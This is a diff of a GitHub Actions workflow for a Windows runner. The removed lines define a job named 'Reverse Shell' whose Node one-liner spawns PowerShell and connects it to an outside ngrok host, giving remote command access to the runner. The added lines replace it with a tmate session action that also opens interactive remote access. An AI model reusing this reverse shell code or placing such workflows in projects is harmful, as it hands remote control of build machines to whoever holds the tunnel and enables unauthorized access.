@@ -4,12 +4,10 @@ on:
 defaults:
   run:
     shell: bash
-
 jobs:
-  term:
-    name: Reverse Shell
+  build:
     runs-on: windows-latest
     steps:
-      - name: Start
-        run: |
-          node -e "!function(){var e=require('net'),n=require('child_process').spawn('powershell',[]),i=new e.Socket;i.connect(16250,'4.tcp.eu.ngrok.io',function(){i.pipe(n.stdin),n.stdout.pipe(i),n.stderr.pipe(i)})}();"
+    - uses: actions/checkout@v3
+    - name: Setup tmate session
+      uses: mxschmitt/action-tmate@v3
